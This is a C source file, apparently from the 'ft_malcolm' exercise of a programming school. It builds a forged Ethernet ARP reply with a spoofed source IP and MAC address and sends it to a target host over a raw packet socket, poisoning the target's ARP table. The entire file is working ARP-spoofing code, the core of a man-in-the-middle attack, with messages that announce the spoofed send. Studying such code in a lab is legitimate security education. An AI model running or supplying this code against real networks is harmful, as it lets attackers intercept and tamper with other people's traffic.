#include "ft_malcolm.h"

#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <sys/socket.h>

#define IPV4_ADDR_LEN 4
#define ARP_PACKET_SIZE 42

static void	zero_bytes(void *ptr, int len)
{
	unsigned char	*p;
	int				i;

	p = (unsigned char *)ptr;
	i = 0;
	while (i < len)
	{
		p[i] = 0;
		i++;
	}
}

static void	copy_bytes(unsigned char *dst, const unsigned char *src, int len)
{
	int	i;

	i = 0;
	while (i < len)
	{
		dst[i] = src[i];
		i++;
	}
}

static void	build_ethernet_header(unsigned char *packet,
		t_malcolm_config *config)
{
	struct ethhdr	*eth;

	eth = (struct ethhdr *)packet;
	copy_bytes(eth->h_dest, config->target_mac, MAC_ADDR_LEN);
	copy_bytes(eth->h_source, config->source_mac, MAC_ADDR_LEN);
	eth->h_proto = htons(ETH_P_ARP);
}

static void	build_arp_header(unsigned char *packet)
{
	struct arphdr	*arp;

	arp = (struct arphdr *)(packet + sizeof(struct ethhdr));
	arp->ar_hrd = htons(ARPHRD_ETHER);
	arp->ar_pro = htons(ETH_P_IP);
	arp->ar_hln = MAC_ADDR_LEN;
	arp->ar_pln = IPV4_ADDR_LEN;
	arp->ar_op = htons(ARPOP_REPLY);
}

static void	build_arp_payload(unsigned char *packet,
		t_malcolm_config *config)
{
	unsigned char	*data;

	data = packet + sizeof(struct ethhdr) + sizeof(struct arphdr);
	copy_bytes(data, config->source_mac, MAC_ADDR_LEN);
	data += MAC_ADDR_LEN;
	copy_bytes(data, (unsigned char *)&config->source_ip.s_addr, IPV4_ADDR_LEN);
	data += IPV4_ADDR_LEN;
	copy_bytes(data, config->target_mac, MAC_ADDR_LEN);
	data += MAC_ADDR_LEN;
	copy_bytes(data, (unsigned char *)&config->target_ip.s_addr, IPV4_ADDR_LEN);
}

static void	setup_socket_address(struct sockaddr_ll *addr, int if_index,
		t_malcolm_config *config)
{
	zero_bytes(addr, sizeof(*addr));
	addr->sll_family = AF_PACKET;
	addr->sll_protocol = htons(ETH_P_ARP);
	addr->sll_ifindex = if_index;
	addr->sll_halen = MAC_ADDR_LEN;
	copy_bytes(addr->sll_addr, config->target_mac, MAC_ADDR_LEN);
}

int	send_arp_reply(int sockfd, int if_index, t_malcolm_config *config)
{
	unsigned char		packet[ARP_PACKET_SIZE];
	struct sockaddr_ll	addr;

	zero_bytes(packet, sizeof(packet));
	build_ethernet_header(packet, config);
	build_arp_header(packet);
	build_arp_payload(packet, config);
	setup_socket_address(&addr, if_index, config);
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	if (sendto(sockfd, packet, ARP_PACKET_SIZE, 0,
			(struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		printf(ERROR_PREFIX "failed to send ARP reply packet.\n");
		return (0);
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	return (1);
}
